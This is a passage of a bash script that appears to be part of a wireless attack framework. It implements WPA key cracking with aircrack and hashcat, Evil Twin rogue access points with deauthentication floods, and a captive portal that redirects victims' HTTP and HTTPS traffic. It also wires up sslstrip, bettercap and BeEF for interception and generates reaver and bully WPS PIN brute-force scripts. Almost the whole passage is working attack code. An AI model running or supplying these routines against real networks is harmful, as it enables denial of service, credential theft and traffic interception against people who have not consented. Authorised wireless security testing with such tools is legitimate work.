	print_hint ${current_menu}

	read -r captive_portal_language_selected
	echo
	case ${captive_portal_language_selected} in
		1)
			captive_portal_language="ENGLISH"
		;;
		2)
			captive_portal_language="SPANISH"
		;;
		3)
			captive_portal_language="FRENCH"
		;;
		4)
			captive_portal_language="CATALAN"
		;;
		5)
			captive_portal_language="PORTUGUESE"
		;;
		6)
			captive_portal_language="RUSSIAN"
		;;
		7)
			captive_portal_language="GREEK"
		;;
		*)
			invalid_captive_portal_language_selected
		;;
	esac
}

#Read and validate the minlength var
function set_minlength() {

	debug_print

	minlength=0
	while [[ ! ${minlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
		echo
		language_strings "${language}" 194 "green"
		read -r minlength
	done
}

#Read and validate the maxlength var
function set_maxlength() {

	debug_print

	maxlength=0
	while [[ ! ${maxlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
		echo
		language_strings "${language}" 195 "green"
		read -r maxlength
	done
}

#Manage the minlength and maxlength vars on bruteforce attacks
function set_minlength_and_maxlength() {

	debug_print

	set_minlength
	maxlength=0
	while [[ ${maxlength} -lt ${minlength} ]]; do
		set_maxlength
	done
}

#Charset selection menu
function set_charset() {

	debug_print

	clear
	language_strings "${language}" 238 "title"
	language_strings "${language}" 196 "green"
	print_simple_separator
	language_strings "${language}" 197
	language_strings "${language}" 198
	language_strings "${language}" 199
	language_strings "${language}" 200

	case ${1} in
		"aircrack")
			language_strings "${language}" 201
			language_strings "${language}" 202
			language_strings "${language}" 203
			language_strings "${language}" 204
			language_strings "${language}" 205
			language_strings "${language}" 206
			language_strings "${language}" 207
			print_hint ${current_menu}
			read -r charset_option
			case ${charset_option} in
				1)
					charset=${crunch_lowercasecharset}
				;;
				2)
					charset=${crunch_uppercasecharset}
				;;
				3)
					charset=${crunch_numbercharset}
				;;
				4)
					charset=${crunch_symbolcharset}
				;;
				5)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}"
				;;
				6)
					charset="${crunch_lowercasecharset}${crunch_numbercharset}"
				;;
				7)
					charset="${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				8)
					charset="${crunch_symbolcharset}${crunch_numbercharset}"
				;;
				9)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				10)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_symbolcharset}"
				;;
				11)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}${crunch_symbolcharset}"
				;;
			esac
		;;
		"hashcat")
			language_strings "${language}" 237
			print_hint ${current_menu}
			read -r charset_option
			case ${charset_option} in
				1)
					charset="?l"
				;;
				2)
					charset="?u"
				;;
				3)
					charset="?d"
				;;
				4)
					charset="?s"
				;;
				5)
					charset="?a"
				;;
			esac

			charset_tmp=${charset}
			for ((i=0; i < maxlength - 1; i++)); do
				charset+=${charset_tmp}
			done
		;;
	esac

	set_show_charset "${1}"
}

#Set a var to show the chosen charset
function set_show_charset() {

	debug_print

	showcharset=""

	case ${1} in
		"aircrack")
			showcharset="${charset}"
		;;
		"hashcat")
			case ${charset_tmp} in
				"?a")
					for item in "${hashcat_charsets[@]}"; do
						if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
							showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
						else
							showcharset+=$(hashcat --help | grep -E "^  ${item#'?'} \|" | awk '{print $3}')
						fi
					done
				;;
				*)
					if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
						showcharset=$(hashcat --help | grep "${charset_tmp} =" | awk '{print $3}')
					else
						showcharset=$(hashcat --help | grep -E "^  ${charset_tmp#'?'} \|" | awk '{print $3}')
					fi
				;;
			esac
		;;
	esac
}

#Execute aircrack+crunch bruteforce attack
function exec_aircrack_bruteforce_attack() {

	debug_print
	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w - \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute aircrack dictionary attack
function exec_aircrack_dictionary_attack() {

	debug_print

	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w \"${DICTIONARY}\" \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat dictionary attack
function exec_hashcat_dictionary_attack() {

	debug_print

	hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat bruteforce attack
function exec_hashcat_bruteforce_attack() {

	debug_print

	hashcat_cmd="hashcat -m 2500 -a 3 \"${tmpdir}${hashcat_tmp_file}\" \"${charset}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat rule based attack
function exec_hashcat_rulebased_attack() {

	debug_print

	hashcat_cmd="hashcat -m 2500 -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute Evil Twin only Access Point attack
function exec_et_onlyap_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	clean_tmpfiles
}

#Execute Evil Twin with sniffing attack
function exec_et_sniffing_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_ettercap_sniffing
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	if [ ${ettercap_log} -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+sslstrip attack
function exec_et_sniffing_sslstrip_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_sslstrip
	launch_ettercap_sniffing
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	if [ ${ettercap_log} -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+bettercap-sslstrip2/beef attack
function exec_et_sniffing_sslstrip2_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	if [ "${beef_found}" -eq 1 ]; then
		set_beef_config
	else
		new_beef_pass="beef"
		et_misc_texts[${language},27]=${et_misc_texts[${language},27]/${beef_pass}/${new_beef_pass}}
		beef_pass="${new_beef_pass}"

	fi
	launch_beef
	launch_bettercap_sniffing
	set_control_script
	launch_control_window

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_beef
	kill_et_windows
	restore_et_interface

	if [ ${bettercap_log} -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}

#Execute captive portal Evil Twin attack
function exec_et_captive_portal_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_control_script
	launch_control_window
	if [ ${captive_portal_mode} = "dnsblackhole" ]; then
		launch_dns_blackhole
	fi
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows
	restore_et_interface
	clean_tmpfiles
}

#Create configuration file for hostapd
function set_hostapd_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1

	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "channel=${channel}"
	echo -e "bssid=${et_bssid}"
	} >> "${tmpdir}${hostapd_file}"
}

#Launch hostapd fake Access Point
function launch_fake_ap() {

	debug_print

	killall hostapd > /dev/null 2>&1
	${airmon} check kill > /dev/null 2>&1
	nm_processes_killed=1

	if [ ${mac_spoofing_desired} -eq 1 ]; then
		set_spoofed_mac "${interface}"
	fi

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			hostapd_scr_window_position=${g1_topleft_window}
		;;
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
			hostapd_scr_window_position=${g3_topleft_window}
		;;
		"et_sniffing_sslstrip")
			hostapd_scr_window_position=${g4_topleft_window}
		;;
	esac
	xterm -hold -bg black -fg blue -geometry "${hostapd_scr_window_position}" -T "AP" -e "hostapd \"${tmpdir}${hostapd_file}\"" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 3
}

#Create configuration file for dhcpd
function set_dhcp_config() {

	debug_print

	if ! route | grep ${ip_range} > /dev/null; then
		et_ip_range=${ip_range}
		et_ip_router=${router_ip}
		et_broadcast_ip=${broadcast_ip}
		et_range_start=${range_start}
		et_range_stop=${range_stop}
	else
		et_ip_range=${alt_ip_range}
		et_ip_router=${alt_router_ip}
		et_broadcast_ip=${alt_broadcast_ip}
		et_range_start=${alt_range_start}
		et_range_stop=${alt_range_stop}
	fi

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
	ifconfig "${interface}" up

	{
	echo -e "authoritative;"
	echo -e "default-lease-time 600;"
	echo -e "max-lease-time 7200;"
	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
	echo -e "\toption broadcast-address ${et_broadcast_ip};"
	echo -e "\toption routers ${et_ip_router};"
	echo -e "\toption subnet-mask ${std_c_mask};"
	} >> "${tmpdir}${dhcpd_file}"

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};" >> "${tmpdir}${dhcpd_file}"
	else
		echo -e "\toption domain-name-servers ${et_ip_router};" >> "${tmpdir}${dhcpd_file}"
	fi

	{
	echo -e "\trange ${et_range_start} ${et_range_stop};"
	echo -e "}"
	} >> "${tmpdir}${dhcpd_file}"

	leases_found=0
	for item in "${!possible_dhcp_leases_files[@]}"; do
		if [ -f "${possible_dhcp_leases_files[${item}]}" ]; then
			leases_found=1
			key_leases_found=${item}
			break
		fi
	done

	if [ ${leases_found} -eq 1 ]; then
		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
	else
		touch "${possible_dhcp_leases_files[0]}"
		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
	fi

	dhcp_path="${tmpdir}${dhcpd_file}"
	if hash apparmor_status 2> /dev/null; then
		if apparmor_status 2> /dev/null | grep dhcpd > /dev/null; then
			if [ -d /etc/dhcpd ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcpd/ 2> /dev/null
				dhcp_path="/etc/dhcpd/${dhcpd_file}"
			elif [ -d /etc/dhcp ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcp/ 2> /dev/null
				dhcp_path="/etc/dhcp/${dhcpd_file}"
			else
				cp "${tmpdir}${dhcpd_file}" /etc/ 2> /dev/null
				dhcp_path="/etc/${dhcpd_file}"
			fi
			dhcpd_path_changed=1
		fi
	fi
}

#Change mac of desired interface
function set_spoofed_mac() {

	debug_print

	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)

	if [ "${spoofed_mac}" -eq 0 ]; then
		spoofed_mac=1
		declare -gA original_macs
		original_macs["${1}"]="${current_original_mac}"
	else
		if [ -z "${original_macs[${1}]}" ]; then
			original_macs["${1}"]="${current_original_mac}"
		fi
	fi

	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')

	ifconfig "${1}" down > /dev/null 2>&1
	ifconfig "${1}" hw ether "${new_random_mac}" > /dev/null 2>&1
	ifconfig "${1}" up > /dev/null 2>&1
}

#Restore spoofed macs to original values
function restore_spoofed_macs() {

	debug_print

	for item in "${!original_macs[@]}"; do
		ifconfig "${item}" down > /dev/null 2>&1
		ifconfig "${item}" hw ether "${original_macs[${item}]}" > /dev/null 2>&1
		ifconfig "${item}" up > /dev/null 2>&1
	done
}

#Set routing state and firewall rules for Evil Twin attacks
function set_std_internet_routing_rules() {

	debug_print

	if [ "${routing_modified}" -eq 0 ]; then
		original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
		save_iptables
	fi

	ifconfig "${interface}" ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
	routing_modified=1

	clean_iptables

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		iptables -P FORWARD ACCEPT
		echo "1" > /proc/sys/net/ipv4/ip_forward
	else
		iptables -P FORWARD DROP
		echo "0" > /proc/sys/net/ipv4/ip_forward
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ${et_ip_router}:80
		iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination ${et_ip_router}:80
		iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
		iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
		if [ ${captive_portal_mode} = "dnsblackhole" ]; then
			iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
		iptables -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
		iptables -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
		iptables -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
		iptables -A INPUT -i lo -j ACCEPT
		iptables -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
	fi

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		iptables -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
	fi

	iptables -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
	iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
	sleep 2
}

#Launch dhcpd server
function launch_dhcp_server() {

	debug_print

	killall dhcpd > /dev/null 2>&1

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			dchcpd_scr_window_position=${g1_bottomleft_window}
		;;
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
			dchcpd_scr_window_position=${g3_middleleft_window}
		;;
		"et_sniffing_sslstrip")
			dchcpd_scr_window_position=${g4_middleleft_window}
		;;
	esac
	xterm -hold -bg black -fg pink -geometry "${dchcpd_scr_window_position}" -T "DHCP" -e "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}/clts.txt" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 2
}

#Execute DoS for Evil Twin attacks
function exec_et_deauth() {

	debug_print

	prepare_et_monitor

	case ${et_dos_attack} in
		"Mdk3")
			killall mdk3 > /dev/null 2>&1
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			killall aireplay-ng > /dev/null 2>&1
			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
		;;
		"Wds Confusion")
			killall mdk3 > /dev/null 2>&1
			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
		;;
	esac

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			deauth_scr_window_position=${g1_bottomright_window}
		;;
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
			deauth_scr_window_position=${g3_bottomleft_window}
		;;
		"et_sniffing_sslstrip")
			deauth_scr_window_position=${g4_bottomleft_window}
		;;
	esac
	xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 1
}

#Create here-doc bash script used for wps pin attacks
function set_wps_attack_script() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${wps_attack_script_file}"

	wps_attack_tool="${1}"
	wps_attack_mode="${2}"
	if [ "${wps_attack_tool}" = "reaver" ]; then
		unbuffer=""
		case ${wps_attack_mode} in
			"pindb"|"custompin")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -N -g 1 -d 2 -vvv -p "
			;;
			"pixiedust")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -K 1 -N -vvv"
			;;
			"bruteforce")
				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -N -d 2 -vvv"
			;;
		esac
	else
		unbuffer="unbuffer "
		case ${wps_attack_mode} in
			"pindb"|"custompin")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p "
			;;
			"pixiedust")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -d -v ${bully_verbosity}"
			;;
			"bruteforce")
				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity}"
			;;
		esac
	fi

	attack_cmd2=" | tee ${tmpdir}${wps_out_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		script_wps_attack_tool="${wps_attack_tool}"
		script_wps_attack_mode="${wps_attack_mode}"
		attack_pin_counter=1
		script_interface="${interface}"
		script_wps_bssid="${wps_bssid}"
		script_wps_channel="${wps_channel}"
		colorize="${colorize}"
	EOF

	cat >&7 <<-'EOF'
		case ${script_wps_attack_mode} in
	EOF

	cat >&7 <<-EOF
			"pindb")
				script_pins_found=(${pins_found[@]})
				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing PIN "
			;;
			"custompin")
				current_pin=${custom_pin}
				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
				pin_header1="${white_color}Testing PIN "
			;;
			"pixiedust")
				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pixiedust} ${attack_cmd1}"
				pin_header1="${white_color}Testing Pixie Dust attack${normal_color}"
			;;
			"bruteforce")
				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
				pin_header1="${white_color}Testing all possible PINs${normal_color}"
			;;
		esac

		pin_header2=" (${yellow_color}"
		pin_header3="${white_color})${normal_color}"
		script_attack_cmd2="${attack_cmd2}"

		#Parse the output file generated by the attack
		function parse_output() {

			readarray -t LINES_TO_PARSE < <(cat < "${tmpdir}${wps_out_file}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
			if [ "${script_wps_attack_tool}" = "reaver" ]; then
				case ${script_wps_attack_mode} in
					"pindb"|"custompin"|"bruteforce")
						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
						pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
						password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
					;;
					"pixiedust")
						success_attack_badpixie_regexp="^\[Pixie\-Dust\].*\[\-\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]*\[\+\][[:space:]]*WPS[[:space:]]pin:.*([0-9]{8})"
						success_attack_goodpixie_password_regexp=".*?\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
					;;
				esac
			else
				case ${script_wps_attack_mode} in
					"pindb"|"custompin"|"bruteforce")
						failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
						success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
						success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
					;;
					"pixiedust")
						success_attack_badpixie_regexp="^\[Pixie\-Dust\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]PIN[[:space:]]FOUND:[[:space:]]([0-9]{8})"
						success_attack_goodpixie_password_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'[0-9]{8}',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
					;;
				esac
			fi

			case ${script_wps_attack_mode} in
				"pindb"|"custompin")
					for item in "${LINES_TO_PARSE[@]}"; do
						if [ "${script_wps_attack_tool}" = "reaver" ]; then
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
								if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
									cracked_pin="${BASH_REMATCH[1]}"
									continue
								elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
									cracked_password="${BASH_REMATCH[1]}"
									return 0
								fi
								pin_cracked=1
								continue
							elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
								return 2
							elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
								return 1
							fi
						else
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
								cracked_pin="${BASH_REMATCH[1]}"
								cracked_password="${BASH_REMATCH[2]}"
								pin_cracked=1
								return 0
							elif [[ ${item} =~ ${failed_attack_regexp} ]]; then
								return 1
							elif [[ ${item} =~ ${success_attack_badpin_regexp} ]]; then
								return 2
							fi
						fi
					done
				;;
				"pixiedust")
					for item in "${LINES_TO_PARSE[@]}"; do
						if [[ ${item} =~ ${success_attack_goodpixie_pin_regexp} ]]; then
							cracked_pin="${BASH_REMATCH[1]}"
							pin_cracked=1
							continue
						elif [[ ${item} =~ ${success_attack_goodpixie_password_regexp} ]]; then
							cracked_password="${BASH_REMATCH[1]}"
							return 0
						fi
					done
					if [ ${pin_cracked} -eq 1 ]; then
						return 0
					fi
				;;
				"bruteforce")
					for item in "${LINES_TO_PARSE[@]}"; do
						if [ "${script_wps_attack_tool}" = "reaver" ]; then
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
								if [[ ${item} =~ ${pin_cracked_regexp} ]]; then
									cracked_pin="${BASH_REMATCH[1]}"
									continue
								elif [[ ${item} =~ ${password_cracked_regexp} ]]; then
									cracked_password="${BASH_REMATCH[1]}"
									return 0
								fi
								pin_cracked=1
								continue
							fi
						else
							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]]; then
								cracked_pin="${BASH_REMATCH[1]}"
								cracked_password="${BASH_REMATCH[2]}"
								pin_cracked=1
								return 0
							fi
						fi
					done
				;;
			esac
			return 3
		}
	EOF

	cat >&7 <<-EOF
		#Prints message for pins on timeout
		function print_timeout() {

			echo
	EOF

	cat >&7 <<-'EOF'
			if [ "${script_wps_attack_mode}" = "pixiedust" ]; then
	EOF

	cat >&7 <<-EOF
				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
			else
				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
			fi
	EOF

	cat >&7 <<-'EOF'
			echo -e "${timeout_msg}"
		}

		pin_cracked=0
		this_pin_timeout=0
		case ${script_wps_attack_mode} in
			"pindb")
				for current_pin in "${script_pins_found[@]}"; do
					possible_bully_timeout=0
					if [ ${attack_pin_counter} -ne 1 ]; then
						sleep 1.5
					fi
					bad_attack_this_pin_counter=0
					if [ "${this_pin_timeout}" -eq 1 ]; then
						print_timeout
					fi

					echo
					echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
					if [ "${script_wps_attack_tool}" = "bully" ]; then
						echo
					fi

					this_pin_timeout=0
					(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2} ${colorize}")
					if [ "$?" = "124" ]; then
						if [ "${script_wps_attack_tool}" = "reaver" ]; then
							this_pin_timeout=1
						else
							possible_bully_timeout=1
						fi
					fi
					attack_pin_counter=$((attack_pin_counter + 1))
					parse_output
					output="$?"
					if [ "${output}" = "0" ]; then
						break
					elif [ "${output}" = "1" ]; then
						this_pin_timeout=1
						continue
					elif [ "${output}" = "2" ]; then
						continue
					elif [[ "${output}" = "3" ]] || [[ "${this_pin_timeout}" -eq 1 ]] || [[ ${possible_bully_timeout} -eq 1 ]]; then
						if [ "${this_pin_timeout}" -eq 1 ]; then
							continue
						fi
						bad_attack_this_pin_counter=$((bad_attack_this_pin_counter + 1))
						if [ ${bad_attack_this_pin_counter} -eq 3 ]; then
							this_pin_timeout=1
							continue
						fi
						if [ ${possible_bully_timeout} -eq 1 ]; then
							this_pin_timeout=1
							continue
						fi
					fi
				done
			;;
			"custompin")
				possible_bully_timeout=0
				echo
				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/1${pin_header3}"
				if [ "${script_wps_attack_tool}" = "bully" ]; then
					echo
				fi

				(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2} ${colorize}")
				if [ "$?" = "124" ]; then
					if [ "${script_wps_attack_tool}" = "reaver" ]; then
						this_pin_timeout=1
					else
						possible_bully_timeout=1
					fi
				fi

				parse_output
				output="$?"
				if [[ "${output}" != "0" ]] && [[ "${output}" != "2" ]]; then
					if [ "${this_pin_timeout}" -ne 1 ]; then
						if [ "${output}" = "1" ]; then
							this_pin_timeout=1
						elif [ ${possible_bully_timeout} -eq 1 ]; then
							if [ ${possible_bully_timeout} -eq 1 ]; then
								this_pin_timeout=1
							fi
						fi
					fi
				fi
			;;
			"pixiedust")
				echo
				echo -e "${pin_header1}"
				if [ "${script_wps_attack_tool}" = "bully" ]; then
					echo
				fi

				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
				if [ "$?" = "124" ]; then
					this_pin_timeout=1
				fi
				parse_output
			;;
			"bruteforce")
				echo
				echo -e "${pin_header1}"
				if [ "${script_wps_attack_tool}" = "bully" ]; then
					echo
				fi
				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
				parse_output
			;;
		esac

		if [ ${pin_cracked} -eq 1 ]; then
	EOF

	cat >&7 <<-EOF
			echo
			pin_cracked_msg="${white_color}PIN cracked: ${yellow_color}"
			password_cracked_msg="${white_color}Password cracked: ${yellow_color}"
			password_not_cracked_msg="${white_color}Password was not cracked: ${yellow_color}Maybe because bad/low signal, or PBC activated on AP"
	EOF

	cat >&7 <<-'EOF'
			echo -e "${pin_cracked_msg}${cracked_pin}"
			if [ -n "${cracked_password}" ]; then
				echo -e "${password_cracked_msg}${cracked_password}"
			else
				echo -e "${password_not_cracked_msg}"
			fi
		fi

		if [ "${this_pin_timeout}" -eq 1 ]; then
	EOF
	cat >&7 <<-EOF
			print_timeout
		fi

		echo
		echo -e "${white_color}Close this window"
	EOF

	exec 7>&-
	sleep 1
}

#Create here-doc bash script used for control windows on Evil Twin attacks
function set_control_script() {

	debug_print

